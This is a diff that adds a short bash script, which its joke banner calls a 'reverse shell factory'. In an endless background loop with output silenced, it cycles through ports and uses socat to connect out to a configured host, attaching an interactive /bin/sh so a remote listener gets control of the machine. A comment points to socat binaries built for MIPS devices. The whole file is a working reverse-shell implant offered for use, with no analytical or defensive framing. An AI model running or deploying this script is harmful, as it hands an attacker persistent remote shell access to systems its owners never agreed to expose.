@@ -1,0 +1,41 @@
+#/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\#
+# ->BABBYS FIRST REVERSE SHELL FACTORY<- #
+#/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\#
+# +RUNS ON YOUR GRANDMAS BLENDER         #
+# +HACKS YOUR EXES FACEBOOK              #
+# +MAKES YOU THE LEADER OF ANONYMOUS     #
+#\--------------------------------------/#
+## Config ###
+STARTPORT=3336
+ENDPORT=3338
+TIMEOUT=90
+HOST='localhost'
+SOCAT=/usr/bin/socat
+#############
+# initialize variable before we enter the while loop
+PORT=0
+while true;
+do
+# ----> remove any old left over files
+        find /tmp/ -iname "*.prt" -exec rm {} \;
+# ----> cycle destination ports when socat times out or you mash CTRL+C               
+        if [[ $PORT == 0 ]]
+        then
+                PORT=$STARTPORT
+        elif [[ $PORT < $((ENDPORT+1)) ]]
+        then
+                PORT=$((PORT+1))
+        fi
+# ----> provide a very crude indicator of what port we are currently using
+        touch /tmp/a${PORT}.prt
+        sleep 3
+# ----> socat? cross-compatible, easy pty, no overhead, we'll use it for more in the future
+#       (hint: https://github.com/darkerego/mips-binaries/blob/master/socat)
+        $SOCAT -T ${TIMEOUT} tcp-connect:${HOST}:${PORT} exec:/bin/sh,pty,stderr,setsid,sigint,sane;
+# ----> if we hit the end, reset the count 
+        if [[ $(($PORT+1)) > $ENDPORT ]];
+        then
+                PORT=0
+        fi
+# suppress all console output and run in the background
+done &>/dev/null& 
